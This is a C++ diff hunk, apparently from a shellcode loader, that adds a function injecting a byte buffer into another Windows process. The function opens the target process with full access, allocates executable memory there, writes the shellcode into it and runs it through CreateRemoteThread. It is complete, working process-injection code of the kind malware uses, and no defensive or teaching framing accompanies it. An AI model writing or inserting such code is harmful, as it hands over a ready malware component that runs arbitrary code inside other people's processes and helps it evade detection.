@@ -210,3 +210,37 @@ bool ParseHexString(const std::string& input, std::vector<uint8_t>& output) {
 
     return !output.empty();
 }
+
+
+bool InjectViaCreateRemoteThread(DWORD pid, const std::vector<uint8_t>& shellcode) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) return false;
+
+    SIZE_T shellcodeSize = shellcode.size();
+    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteMem, shellcode.data(), shellcodeSize, nullptr)) {
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
+        (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
+    if (!hThread) {
+        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);  // Optional: wait for execution
+    CloseHandle(hThread);
+    // Note: We don't free memory here — shellcode might be running or self-cleaning
+
+    CloseHandle(hProcess);
+    return true;
+}
